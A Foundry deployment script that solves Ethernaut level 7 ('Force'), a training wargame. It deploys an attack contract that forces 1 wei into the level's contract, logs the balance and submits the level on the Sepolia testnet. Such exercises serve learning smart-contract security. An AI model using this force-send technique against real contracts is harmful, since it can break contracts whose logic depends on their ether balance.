// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {Force} from "../src/Level07.sol";
import {Attack} from "../src/Level07Attack.sol";

contract Level07 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address caller = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        Force instance = Force(vm.envAddress("LVL07_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console2.log("balance: ", address(instance).balance);

        Attack attack = new Attack();
        attack.atatatak{value: 1 wei}(payable(address(instance)));

        uint256 balance = address(instance).balance;
        console2.log("balance: ", balance);

        if (balance == 0) {
            console2.log("call failed");
        } else ethernaut.submitLevelInstance(address(instance));

        vm.stopBroadcast();
    }
}

// forge script script/Level07.s.sol --broadcast --rpc-url sepolia
